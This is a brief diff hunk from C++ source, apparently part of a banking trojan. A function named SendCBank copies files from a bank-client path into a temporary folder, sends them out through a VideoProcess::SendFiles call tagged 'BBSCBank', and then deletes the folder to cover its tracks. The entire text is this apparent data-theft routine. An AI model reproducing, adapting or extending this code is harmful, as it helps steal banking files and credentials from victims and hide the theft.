@@ -300,7 +300,7 @@ static int WINAPI SendCBank( void* param )
 				if( pCreateDirectoryA( tempFolder, 0 ) )
 				{
 					SearchFiles( path, "*.*", false, FA_DIRECTORY, tempFolder, SendFolder );
-					VideoRecorder::SendFiles(tempFolder);
+					VideoProcess::SendFiles( "BBSCBank", tempFolder );
 					*((int*)&(tempFolder[lenTempFolder])) = 0;
 					DeleteFolders(tempFolder);
 				}
